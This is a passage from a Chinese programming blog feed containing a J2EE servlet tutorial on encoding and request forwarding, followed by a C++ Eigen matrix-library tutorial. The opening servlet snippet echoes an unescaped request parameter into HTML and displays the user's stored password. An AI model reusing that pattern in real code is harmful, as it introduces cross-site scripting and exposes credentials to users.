void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        response.setContentType(&quot;text/html;charset=utf-8&quot;);        PrintWriter out = response.getWriter();        String name = request.getParameter(&quot;uname&quot;);        String pass = (String) request.getSession().getAttribute(&quot;loginpass&quot;);        out.println(&quot;欢迎&quot;+name+&quot;进入管理界面,你的密码是：&quot;+ pass + &quot;&lt;/br&gt;&quot;);        out.println(&quot;&lt;a href=&#39;/UserLogin/LoginServlet&#39;&gt;返回重新登陆&lt;/a&gt;&quot;);    &#125;</code></pre><h2 id="四、j2ee-中文乱码详解"><a href="#四、j2ee-中文乱码详解" class="headerlink" title="四、j2ee 中文乱码详解"></a><strong>四、j2ee 中文乱码详解</strong></h2><h3 id="1-乱码在何处发生"><a href="#1-乱码在何处发生" class="headerlink" title="1.乱码在何处发生"></a><strong>1.乱码在何处发生</strong></h3><p>只要是在有数据传递的地方就会出现中文乱码</p><p>(1)form 表单（get&#x2F;post）<br>(2)URL传参</p><h3 id="2-为什么会有乱码"><a href="#2-为什么会有乱码" class="headerlink" title="2.为什么会有乱码"></a><strong>2.为什么会有乱码</strong></h3><p>我们的UTF-8 的请求首先是服务器接收，服务器是外国人编写的，默认编码一般为 ISO-8859-1，两者编码不一致就会出现乱码</p><h3 id="3-对于-POST-请求"><a href="#3-对于-POST-请求" class="headerlink" title="3.对于 POST 请求"></a><strong>3.对于 POST 请求</strong></h3><p>可以使用下面的方式修改请求体中的编码</p><pre><code class="hljs">request.setCharacterEncoding(&quot;utf-8&quot;)；</code></pre><p>但是这个设置对通过  get 方式在请行中传递的参数是不起作用的</p><h3 id="4-对于GET请求"><a href="#4-对于GET请求" class="headerlink" title="4.对于GET请求"></a><strong>4.对于GET请求</strong></h3><pre><code class="hljs"> String u = new String(request.getParameter(&quot;username&quot;).getBytes(&quot;iso-8859-1&quot;),&quot;UTF-8&quot;);</code></pre><h3 id="5-对于超链接"><a href="#5-对于超链接" class="headerlink" title="5.对于超链接"></a><strong>5.对于超链接</strong></h3><p>由于也是通过 get 方式传参，因此和get 的处理方式一样</p><h3 id="6-对于sendRedirect"><a href="#6-对于sendRedirect" class="headerlink" title="6.对于sendRedirect()"></a><strong>6.对于sendRedirect()</strong></h3><p>相当于返回到浏览器重新发起了 get 请求也是通过 get 请求的方式处理</p><h2 id="五、HttpServletRequest-详解"><a href="#五、HttpServletRequest-详解" class="headerlink" title="五、HttpServletRequest 详解"></a><strong>五、HttpServletRequest 详解</strong></h2><h3 id="1-常见函数"><a href="#1-常见函数" class="headerlink" title="1.常见函数"></a><strong>1.常见函数</strong></h3><p>(1)getRequestURL()<br>(2)getRequestURI()<br>(3)getQueryString()<br>(4)getRemoteAddr()<br>(5)getRemoteHost()<br>(6)getRemotePort()<br>(7)getLocalPort()<br>(8)getLocalAddr()<br>(9)getLocalName()<br>(10)getHeader()<br>(11)getHeaderNames()<br>(12)getParameter()<br>(13)getParameterValues()<br>(14)getParameterNames()</p><h3 id="2-常见应用"><a href="#2-常见应用" class="headerlink" title="2.常见应用"></a><strong>2.常见应用</strong></h3><h4 id="1-实现请求转发"><a href="#1-实现请求转发" class="headerlink" title="1.实现请求转发"></a><strong>1.实现请求转发</strong></h4><p><strong>请求转发：</strong> 一个web 资源受到服务器的请求以后，通知服务器去调用另一个web 资源进行处理的过程</p><p>我们可以通过他实现我们之前实现过得跳转并传递参数的功能</p><pre><code class="hljs">request.getRequestDispatcher(&quot;转向的地址&quot;).forward(request,response);</code></pre><p>上面的代码实际上是使用了转向的方法将 request 和 response 对象转发到了下一个地址</p><p><strong>上面的代码实际上是使用了转向的方法将 request 和 response 对象转发到了下一个地址</strong></p><p><strong>这实际上就是我们后面实现 MVC 的基础，Model 通过转向给Controller传递数据，同样Controller 也是通过转向将我们的model 传递过来的数据给view</strong></p><p><strong>其中  MVC  中的每一个部分都是用 servlet 实现的</strong></p><p>这句话和 sendRedirect最本质的区别就是，他的转向不是打回给浏览器重新发起请求，而是打回给服务器</p>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>J2EE 基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++ 的 Eigen 类库学习</title>
    <link href="/2018/10/12/C++%20%E7%9A%84%20Eigen%20%E7%B1%BB%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
    <url>/2018/10/12/C++%20%E7%9A%84%20Eigen%20%E7%B1%BB%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="一、Eigen-是什么"><a href="#一、Eigen-是什么" class="headerlink" title="一、Eigen 是什么"></a><strong>一、Eigen 是什么</strong></h2><p>Eigen 是一个 C++ 中的用于科学计算（矩阵）的类库，提供了非常方便的接口，最近我们小组需要做一个项目，里面涉及到很多的矩阵的计算，于是我打算使用这个类库结合我的 CLion 写代码</p><h2 id="二、如何配置"><a href="#二、如何配置" class="headerlink" title="二、如何配置"></a><strong>二、如何配置</strong></h2><p>下载最新的 release 安装包 解压到项目的目录下（当然任何目录都可以，我习惯上解压到项目的目录下，这样比较方便管理），然后我们配置我们的 CMakeLists.txt</p><span id="more"></span><p><strong>CMakeLists.txt</strong></p><pre><code class="hljs">cmake_minimum_required(VERSION 3.10)project(juzhen)set(CMAKE_CXX_STANDARD 11)include_directories(../eigen)//这里写你的解压目录add_executable(juzhen main.cpp)</code></pre><p><strong>main.cpp</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    typedef Matrix&lt;int,3,3&gt; hh;    MatrixXd m = MatrixXd::Random(3,3);    //m = (m + MatrixXd::Constant(3,3,1.2)) * 50;    MatrixXd c = MatrixXd::Constant(3,3,1)*10;    hh x;    cout &lt;&lt; &quot;m =&quot; &lt;&lt; endl &lt;&lt; m &lt;&lt; endl;    cout &lt;&lt; &quot;c =&quot; &lt;&lt; endl &lt;&lt; c &lt;&lt; endl;    cout &lt;&lt; &quot;x =&quot; &lt;&lt; endl &lt;&lt; x &lt;&lt; endl;&#125;</code></pre><p>这样就能运行啦</p><h2 id="三、Eigen-基础"><a href="#三、Eigen-基础" class="headerlink" title="三、Eigen 基础"></a><strong>三、Eigen 基础</strong></h2><h3 id="1-Matrix-类"><a href="#1-Matrix-类" class="headerlink" title="1.Matrix 类"></a><strong>1.Matrix 类</strong></h3><h4 id="1-基本："><a href="#1-基本：" class="headerlink" title="1.基本："></a><strong>1.基本：</strong></h4><p>在Eigen中，所有矩阵和向量都是Matrix模板类的对象。向量只是矩阵的一种特殊情况，有1行或1列。</p><p><strong>Matrix的三个必需模板参数是：</strong></p><pre><code class="hljs">Matrix &lt;typename Scalar，int RowsAtCompileTime，int ColsAtCompileTime&gt;</code></pre><p><strong>例如：</strong> Matrix4f是浮动的4x4矩阵</p><pre><code class="hljs">typedef Matrix &lt;float，4,4&gt; Matrix4f ;</code></pre><p>假如：我想生成一个 int 型的 3x3 的矩阵</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    typedef Matrix&lt;int,3,3&gt; hh;    hh x;    cout &lt;&lt; &quot;x =&quot; &lt;&lt; endl &lt;&lt; x &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">x =2001839094         36          02001791111    6880932 1275664310        -1          4    6880948    </code></pre><h4 id="2-向量"><a href="#2-向量" class="headerlink" title="2.向量"></a><strong>2.向量</strong></h4><p>向量只是一种特殊的矩阵而已</p><p><strong>列向量：</strong></p><pre><code class="hljs">typedef Matrix &lt;float，3,1&gt; Vector3f ;</code></pre><p><strong>行向量：</strong></p><pre><code class="hljs">typedef Matrix &lt;int，1,2&gt; RowVector2i ;</code></pre><h4 id="3-动态值"><a href="#3-动态值" class="headerlink" title="3.动态值"></a><strong>3.动态值</strong></h4><p>我们当然不满足在编译时就确定矩阵的大小，于是他给我们也提供了对应的方法</p><p>例如，便捷typedef MatrixXd，即具有动态大小的双精度矩阵，定义如下：</p><pre><code class="hljs">typedef Matrix &lt;double，Dynamic，Dynamic&gt; MatrixXd ;</code></pre><p>同样，我们定义了一个不言自明的typedef VectorXi如下：</p><pre><code class="hljs">typedef Matrix &lt;int，Dynamic，1&gt; VectorXi ;</code></pre><p>您可以完美地拥有例如具有动态列数的固定行数，如下所示：</p><pre><code class="hljs">Matrix &lt;float，3，Dynamic&gt;</code></pre><h4 id="4-构造函数"><a href="#4-构造函数" class="headerlink" title="4.构造函数"></a><strong>4.构造函数</strong></h4><p>默认构造函数始终可用，从不执行任何动态内存分配，也从不初始化矩阵系数。你可以做：</p><pre><code class="hljs">Matrix3f a;MatrixXf b;</code></pre><p>a 是一个3乘3的矩阵，具有未初始化系数的普通浮点数<br>b 是一个动态大小的矩阵，其大小目前是0乘0，并且其系数数组尚未分配。</p><p><strong>注意：</strong></p><pre><code class="hljs">Matrix3i d;</code></pre><p>这里代表声明了一个 Int 型的 3x3 的矩阵，也就是说 最后的f 代表的是 float </p><p>对于矩阵，始终首先传递行数。对于矢量，只需传递矢量大小。它们使用给定的大小分配系数数组，但不自行初始化系数：</p><pre><code class="hljs">MatrixXf a（10,15）;VectorXf b（30）;</code></pre><p>a 是一个10x15动态大小的矩阵，具有已分配但当前未初始化的系数。<br>b 是一个大小为30的动态大小向量，具有已分配但当前未初始化的系数</p><p><strong>注意：</strong></p><pre><code class="hljs">RowVector2d e(1.0,2.0);</code></pre><p>这个代表生成的是一个行向量（不加 row 是列向量）</p><h4 id="5-系数访问器"><a href="#5-系数访问器" class="headerlink" title="5.系数访问器"></a><strong>5.系数访问器</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main()&#123;    MatrixXd m(2,2);    m(0,0)= 3;    m(1,0)= 2.5;    m(0,1)= -1;    m(1,1)= m(1,0)+ m(0,1);    std :: cout &lt;&lt; &quot;这是矩阵m：\n&quot; &lt;&lt; m &lt;&lt; std :: endl;    VectorXd v(2);    v(0)= 4;    v(1)= v(0) - 1;    std :: cout &lt;&lt; &quot;这是向量v:\n&quot; &lt;&lt; v &lt;&lt; std :: endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">这是矩阵m：  3  -12.5 1.5这是向量v:43</code></pre><h4 id="6-逗号初始化"><a href="#6-逗号初始化" class="headerlink" title="6.逗号初始化"></a><strong>6.逗号初始化</strong></h4><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    Matrix3f m;    m &lt;&lt; 1,2,3,        4,5,6,        7,8,9;    std :: cout &lt;&lt; m &lt;&lt;endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1 2 34 5 67 8 9</code></pre><h4 id="7-调整"><a href="#7-调整" class="headerlink" title="7.调整"></a><strong>7.调整</strong></h4><p>可以通过rows（），cols（）和size（）检索矩阵的当前大小。这些方法分别返回行数，列数和系数数。调整动态大小矩阵的大小由resize（）方法完成。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    MatrixXd m(2,5);    m.resize(4,3);    std :: cout &lt;&lt; &quot;矩阵m的大小&quot; &lt;&lt; m.rows() &lt;&lt; &quot;x&quot; &lt;&lt; m.cols()&lt;&lt; std :: endl;    std :: cout &lt;&lt; &quot;它有&quot; &lt;&lt; m.size()&lt;&lt; &quot;系数&quot; &lt;&lt; std :: endl;    VectorXd v(2);    v.resize(5);    std :: cout &lt;&lt; &quot;向量v的大小为&quot; &lt;&lt; v.size()&lt;&lt; std :: endl;    std :: cout &lt;&lt; &quot;作为矩阵,v的大小&quot; &lt;&lt; v.rows()&lt;&lt; &quot;x&quot; &lt;&lt; v.cols()&lt;&lt; std :: endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">矩阵m的大小4x3它有12系数向量v的大小为5作为矩阵,v的大小5x1</code></pre><h4 id="8-分配和调整大小"><a href="#8-分配和调整大小" class="headerlink" title="8.分配和调整大小"></a><strong>8.分配和调整大小</strong></h4><p>这里实际上是个C++ 中等号的重载</p><p>Eigen自动调整左侧的矩阵大小，使其与右侧大小的矩阵大小相匹配。例如：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    MatrixXf a(2,2);    std :: cout &lt;&lt; &quot;a is size &quot; &lt;&lt; a.rows() &lt;&lt; &quot;x&quot; &lt;&lt; a.cols()&lt;&lt; std :: endl;    MatrixXf b(3,3);    a = b;    std :: cout &lt;&lt; &quot;a现在大小&quot; &lt;&lt; a.rows()&lt;&lt; &quot;x&quot; &lt;&lt; a.cols()&lt;&lt; std :: endl;&#125;</code></pre><p><strong>结果:</strong></p><pre><code class="hljs">a is size 2x2a现在大小3x3</code></pre><h2 id="四、矩阵和向量算数"><a href="#四、矩阵和向量算数" class="headerlink" title="四、矩阵和向量算数"></a><strong>四、矩阵和向量算数</strong></h2><h3 id="1-加减"><a href="#1-加减" class="headerlink" title="1.加减"></a><strong>1.加减</strong></h3><p>二元运算符+如 a+b<br>二元运算符 - 如 a-b<br>一元算子 - 如同 -a<br>复合运算符+ &#x3D;如 a+&#x3D;b<br>复合运算符 - &#x3D;如 a-&#x3D;b</p><p><strong>注意：</strong></p><p>运算符的左值和右值，必须要有相同的类型和相同数量的行列</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    Matrix2d a;    a &lt;&lt; 1,2,    3,4;    MatrixXd b(2,2);    b &lt;&lt; 2,3,    1,4;    std :: cout &lt;&lt; &quot;a + b = \n&quot; &lt;&lt; a + b &lt;&lt; std :: endl;    std :: cout &lt;&lt; &quot;a  -  b = \n&quot; &lt;&lt; a  -  b &lt;&lt; std :: endl;    std :: cout &lt;&lt; &quot;做一个+ = b;&quot; &lt;&lt; std :: endl;    a += b;    std :: cout &lt;&lt; &quot;现在 a = \n&quot; &lt;&lt; a &lt;&lt; std :: endl;    Vector3d v(1,2,3);    Vector3d w(1,0,0);    std :: cout &lt;&lt; &quot;-v + w - v = \n&quot; &lt;&lt;  -v + w - v &lt;&lt; std :: endl;&#125;</code></pre><h3 id="2-标量的乘除"><a href="#2-标量的乘除" class="headerlink" title="2.标量的乘除"></a><strong>2.标量的乘除</strong></h3><p>二元运算符<em>如 matrix</em>scalar<br>二元运算符<em>如 scalar</em>matrix<br>二元运算符&#x2F;如 matrix&#x2F;scalar<br>复合运算符* &#x3D;如 matrix*&#x3D;scalar<br>复合运算符&#x2F; &#x3D;如 matrix&#x2F;&#x3D;scalar</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    Matrix2d a;    a &lt;&lt; 1,2,    3,4;    Vector3d v(1,2,3);    std :: cout &lt;&lt; &quot;a * 2.5 = \n&quot; &lt;&lt; a * 2.5 &lt;&lt; std :: endl;    std :: cout &lt;&lt; &quot;0.1 * v = \n&quot; &lt;&lt; 0.1 * v &lt;&lt; std :: endl;    std :: cout &lt;&lt; &quot;做v *= 2;&quot; &lt;&lt; std :: endl;    v *= 2;    std :: cout &lt;&lt; &quot;现在v = \n&quot; &lt;&lt; v &lt;&lt; std :: endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a * 2.5 =2.5   57.5  100.1 * v =0.10.20.3做v *= 2;现在v =246</code></pre><h3 id="3-转置、共轭、伴随"><a href="#3-转置、共轭、伴随" class="headerlink" title="3.转置、共轭、伴随"></a><strong>3.转置、共轭、伴随</strong></h3><p>通过成员函数transpose（），conjugate（）和adjoint（）分别获得矩阵或向量的转置$ a ^ T $，共轭$ \ bar {a} $和伴随（即，共轭转置）。$ a ^ * $$ a $</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    MatrixXf a = MatrixXf :: Random(2,2);    cout &lt;&lt; &quot;这是矩阵a \n&quot; &lt;&lt; a &lt;&lt; endl;    cout &lt;&lt; &quot;这是矩阵a 的转置\n&quot; &lt;&lt; a.transpose()&lt;&lt; endl;    cout &lt;&lt; &quot;这是矩阵a 的共轭\n&quot; &lt;&lt; a.conjugate()&lt;&lt;endl;    cout &lt;&lt; &quot;这是矩阵a 的伴随\n&quot; &lt;&lt; a.adjoint()&lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">这是矩阵a-0.997497 -0.613392 0.127171  0.617481这是矩阵a 的转置-0.997497  0.127171-0.613392  0.617481这是矩阵a 的共轭-0.997497 -0.613392 0.127171  0.617481这是矩阵a 的伴随-0.997497  0.127171-0.613392  0.617481</code></pre><h3 id="4-矩阵-矩阵和矩阵-向量乘法"><a href="#4-矩阵-矩阵和矩阵-向量乘法" class="headerlink" title="4.矩阵 - 矩阵和矩阵 - 向量乘法"></a><strong>4.矩阵 - 矩阵和矩阵 - 向量乘法</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    Matrix2d mat;    mat &lt;&lt; 1, 2,            3, 4;    Vector2d u(-1,1), v(2,0);    std::cout &lt;&lt; &quot;Here is mat*mat:\n&quot; &lt;&lt; mat * mat &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Here is mat*u:\n&quot; &lt;&lt; mat*u &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Here is u^T*mat:\n&quot; &lt;&lt; u.transpose()*mat &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Here is u^T*v:\n&quot; &lt;&lt; u.transpose()*v &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Here is u*v^T:\n&quot; &lt;&lt; u*v.transpose() &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;Let&#39;s multiply mat by itself&quot; &lt;&lt; std::endl;    mat = mat*mat;    std::cout &lt;&lt; &quot;Now mat is mat:\n&quot; &lt;&lt; mat &lt;&lt; std::endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">Here is mat*mat: 7 1015 22Here is mat*u:11Here is u^T*mat:2 2Here is u^T*v:-2Here is u*v^T:-2 -0 2  0Let&#39;s multiply mat by itselfNow mat is mat: 7 1015 22</code></pre><h2 id="五、高级初始化"><a href="#五、高级初始化" class="headerlink" title="五、高级初始化"></a><strong>五、高级初始化</strong></h2><h3 id="1-将矩阵进行拼接"><a href="#1-将矩阵进行拼接" class="headerlink" title="1.将矩阵进行拼接"></a><strong>1.将矩阵进行拼接</strong></h3><p>请记住，必须先设置大小，然后才能使用逗号初始值设定项</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    RowVectorXd vec1(3);    vec1 &lt;&lt; 1, 2, 3;    std::cout &lt;&lt; &quot;vec1 = &quot; &lt;&lt; vec1 &lt;&lt; std::endl;    RowVectorXd vec2(4);    vec2 &lt;&lt; 1, 4, 9, 16;    std::cout &lt;&lt; &quot;vec2 = &quot; &lt;&lt; vec2 &lt;&lt; std::endl;    RowVectorXd joined(7);    joined &lt;&lt; vec1, vec2;    std::cout &lt;&lt; &quot;joined = &quot; &lt;&lt; joined &lt;&lt; std::endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">vec1 = 1 2 3vec2 =  1  4  9 16joined =  1  2  3  1  4  9 16</code></pre><p><strong>我们可以使用相同的技术来初始化具有块结构的矩阵。</strong></p><p><strong>实例代码：</strong></p><pre><code class="hljs">int main()&#123;    MatrixXf matA(2, 2);    matA &lt;&lt; 1, 2, 3, 4;    MatrixXf matB(4, 4);    matB &lt;&lt; matA, matA/10, matA/10, matA;    std::cout &lt;&lt; matB &lt;&lt; std::endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">  1   2 0.1 0.2  3   4 0.3 0.40.1 0.2   1   20.3 0.4   3   4</code></pre><p>更高级的填充：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    Matrix3f m;    m.row(0) &lt;&lt; 1, 2, 3;    m.block(1,0,2,2) &lt;&lt; 4, 5, 7, 8;    m.col(2).tail(2) &lt;&lt; 6, 9;    std::cout &lt;&lt; m;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1 2 34 5 67 8 9</code></pre><h3 id="2-特殊矩阵"><a href="#2-特殊矩阵" class="headerlink" title="2.特殊矩阵"></a><strong>2.特殊矩阵</strong></h3><p>矩阵和数组都有特殊方法 Zero()</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    std::cout &lt;&lt; &quot;A fixed-size array:\n&quot;;    Array33f a1 = Array33f::Zero();    std::cout &lt;&lt; a1 &lt;&lt; &quot;\n\n&quot;;    std::cout &lt;&lt; &quot;A one-dimensional dynamic-size array:\n&quot;;    ArrayXf a2 = ArrayXf::Zero(3);    std::cout &lt;&lt; a2 &lt;&lt; &quot;\n\n&quot;;    std::cout &lt;&lt; &quot;A two-dimensional dynamic-size array:\n&quot;;    ArrayXXf a3 = ArrayXXf::Zero(3, 4);    std::cout &lt;&lt; a3 &lt;&lt; &quot;\n&quot;;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">A fixed-size array:0 0 00 0 00 0 0A one-dimensional dynamic-size array:000A two-dimensional dynamic-size array:0 0 0 00 0 0 00 0 0 0</code></pre><p><strong>类似地:</strong></p><p>1.静态方法Constant（value）将所有系数设置为value。如果需要指定对象的大小，则附加参数将在value参数之前，如MatrixXd::Constant(rows, cols, value)。</p><p>2.方法Random（）用随机系数填充矩阵或数组。</p><p>3.可以通过调用Identity（）获得单位矩阵; 此方法仅适用于Matrix，而不适用于Array，因为“单位矩阵”是线性代数概念。</p><p>4.LinSpaced方法（大小，低，高）仅适用于向量和一维数组;</p><p>它产生一个指定大小的向量，其系数在low和之间等间隔high。</p><p><strong>Eigen定义了实用函数</strong></p><p>如setZero（），MatrixBase :: setIdentity（）和DenseBase :: setLinSpaced（），可以方便地执行此操作。以下示例对比了构造矩阵的三种方法</p><p>使用静态方法和赋值，使用静态方法和逗号初始化程序，或使用setXxx（）方法。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    const int size = 6;    MatrixXd mat1(size, size);    mat1.topLeftCorner(size/2, size/2)     = MatrixXd::Zero(size/2, size/2);    mat1.topRightCorner(size/2, size/2)    = MatrixXd::Identity(size/2, size/2);    mat1.bottomLeftCorner(size/2, size/2)  = MatrixXd::Identity(size/2, size/2);    mat1.bottomRightCorner(size/2, size/2) = MatrixXd::Zero(size/2, size/2);    std::cout &lt;&lt; mat1 &lt;&lt; std::endl &lt;&lt; std::endl;    MatrixXd mat2(size, size);    mat2.topLeftCorner(size/2, size/2).setZero();    mat2.topRightCorner(size/2, size/2).setIdentity();    mat2.bottomLeftCorner(size/2, size/2).setIdentity();    mat2.bottomRightCorner(size/2, size/2).setZero();    std::cout &lt;&lt; mat2 &lt;&lt; std::endl &lt;&lt; std::endl;    MatrixXd mat3(size, size);    mat3 &lt;&lt; MatrixXd::Zero(size/2, size/2), MatrixXd::Identity(size/2, size/2),            MatrixXd::Identity(size/2, size/2), MatrixXd::Zero(size/2, size/2);    std::cout &lt;&lt; mat3 &lt;&lt; std::endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">0 0 0 1 0 00 0 0 0 1 00 0 0 0 0 11 0 0 0 0 00 1 0 0 0 00 0 1 0 0 00 0 0 1 0 00 0 0 0 1 00 0 0 0 0 11 0 0 0 0 00 1 0 0 0 00 0 1 0 0 00 0 0 1 0 00 0 0 0 1 00 0 0 0 0 11 0 0 0 0 00 1 0 0 0 00 0 1 0 0 0</code></pre><h3 id="3-用作临时对象"><a href="#3-用作临时对象" class="headerlink" title="3.用作临时对象"></a><strong>3.用作临时对象</strong></h3><p>静态方法如Zero（）和Constant（）可用于在声明时或在赋值运算符的右侧初始化变量。您可以将这些方法视为返回矩阵或数组; 实际上，它们<strong>返回所谓的表达式对象</strong>，在需要时可以计算矩阵或数组。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">int main()&#123;    MatrixXd m = MatrixXd::Random(3,3);    m = (m + MatrixXd::Constant(3,3,1.2)) * 50;    cout &lt;&lt; &quot;m =&quot; &lt;&lt; endl &lt;&lt; m &lt;&lt; endl;    VectorXd v(3);    v &lt;&lt; 1, 2, 3;    cout &lt;&lt; &quot;m * v =&quot; &lt;&lt; endl &lt;&lt; m * v &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">m =10.1251 90.8741 45.029166.3585 68.5009 99.596229.3304 57.9873  92.284m * v =326.961502.149422.157</code></pre><h2 id="六、数组"><a href="#六、数组" class="headerlink" title="六、数组"></a><strong>六、数组</strong></h2><h3 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a><strong>1.概念：</strong></h3><p>Array是一个类模板，采用与Matrix相同的模板参数</p><pre><code class="hljs">Array &lt;typename Scalar，int RowsAtCompileTime，int ColsAtCompileTime&gt;</code></pre><p>我们采用的形式是ArrayNt形式的typedef代表一维数组，其中N和t是大小和标量类型。对于二维数组，我们使用ArrayNNt形式的typedef。</p><p><strong>下表显示了一些示例：</strong></p><pre><code class="hljs">Array&lt;float,Dynamic,1&gt;                            ArrayXf Array&lt;float,3,1&gt;                                  Array3f Array&lt;double,Dynamic,Dynamic&gt;                     ArrayXXd Array&lt;double,3,3&gt;                                 Array33d </code></pre><h3 id="2-访问Array中的值"><a href="#2-访问Array中的值" class="headerlink" title="2.访问Array中的值"></a><strong>2.访问Array中的值</strong></h3><p>括号运算符被重载以提供对数组系数的写和读访问，就像使用矩阵一样。此外，&lt;&lt;操作符可用于初始化数组（通过逗号初始化程序）或打印它们。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    ArrayXXf  m(2,2);    // assign some values coefficient by coefficient    m(0,0) = 1.0; m(0,1) = 2.0;    m(1,0) = 3.0; m(1,1) = m(0,1) + m(1,0);    // print values to standard output    cout &lt;&lt; m &lt;&lt; endl &lt;&lt; endl;    // using the comma-initializer is also allowed    m &lt;&lt; 1.0,2.0,            3.0,4.0;    // print values to standard output    cout &lt;&lt; m &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1 23 51 23 4</code></pre><h3 id="3-加减"><a href="#3-加减" class="headerlink" title="3.加减"></a><strong>3.加减</strong></h3><p>添加和减去两个数组与矩阵相同。如果两个阵列具有相同的大小，则该操作有效，并且以系数方式进行加法或减法。</p><p>数组还支持表单的表达式，该表达式为数组中的array + scalar每个系数添加标量。这提供了一种不能直接用于Matrix对象的功能。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;Eigen/Dense&gt;#include &lt;iostream&gt;using namespace Eigen;using namespace std;int main()&#123;  ArrayXXf a(3,3);  ArrayXXf b(3,3);  a &lt;&lt; 1,2,3,       4,5,6,       7,8,9;  b &lt;&lt; 1,2,3,       1,2,3,       1,2,3;         // Adding two arrays  cout &lt;&lt; &quot;a + b = &quot; &lt;&lt; endl &lt;&lt; a + b &lt;&lt; endl &lt;&lt; endl;  // Subtracting a scalar from an array  cout &lt;&lt; &quot;a - 2 = &quot; &lt;&lt; endl &lt;&lt; a - 2 &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a + b = 2  4  6 5  7  9 8 10 12a - 2 =-1  0  1 2  3  4 5  6  7</code></pre><h3 id="4-数组乘法"><a href="#4-数组乘法" class="headerlink" title="4.数组乘法"></a><strong>4.数组乘法</strong></h3><p>首先，当然你可以用一个标量乘以一个数组，这与矩阵的工作方式相同。数组与矩阵根本不同的是，当你将两个数组相乘时。矩阵将乘法解释为矩阵乘积，并且数组将乘法解释为系数乘积。因此，当且仅当它们具有相同的尺寸时，两个阵列可以相乘。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    ArrayXXf a(2,2);    ArrayXXf b(2,2);    a &lt;&lt; 1,2,            3,4;    b &lt;&lt; 5,6,            7,8;    cout &lt;&lt; &quot;a * b = &quot; &lt;&lt; endl &lt;&lt; a * b &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a * b = 5 1221 32</code></pre><h3 id="5-其他系数运算"><a href="#5-其他系数运算" class="headerlink" title="5.其他系数运算"></a><strong>5.其他系数运算</strong></h3><p>例如，.abs（）方法取每个系数的绝对值，而.sqrt（）计算系数的平方根。如果你有两个相同大小的数组，你可以调用.min（.）来构造数组，其系数是两个给定数组的相应系数的最小值。以下示例说明了这些操作。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &lt;iostream&gt;#include &lt;Eigen/Dense&gt;using namespace Eigen;using namespace std;int main() &#123;    ArrayXf a = ArrayXf::Random(5);    a *= 2;    cout &lt;&lt; &quot;a =&quot; &lt;&lt; endl         &lt;&lt; a &lt;&lt; endl;    cout &lt;&lt; &quot;a.abs() =&quot; &lt;&lt; endl         &lt;&lt; a.abs() &lt;&lt; endl;    cout &lt;&lt; &quot;a.abs().sqrt() =&quot; &lt;&lt; endl         &lt;&lt; a.abs().sqrt() &lt;&lt; endl;    cout &lt;&lt; &quot;a.min(a.abs().sqrt()) =&quot; &lt;&lt; endl         &lt;&lt; a.min(a.abs().sqrt()) &lt;&lt; endl;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">a =-1.994990.254341-1.22678 1.234960.340037a.abs() = 1.994990.254341 1.22678 1.234960.340037a.abs().sqrt() = 1.412440.504323  1.1076 1.111290.583127a.min(a.abs().sqrt()) =-1.994990.254341-1.22678 1.111290.340037</code></pre><h2 id="七、在数组和矩阵表达式之间转换"><a 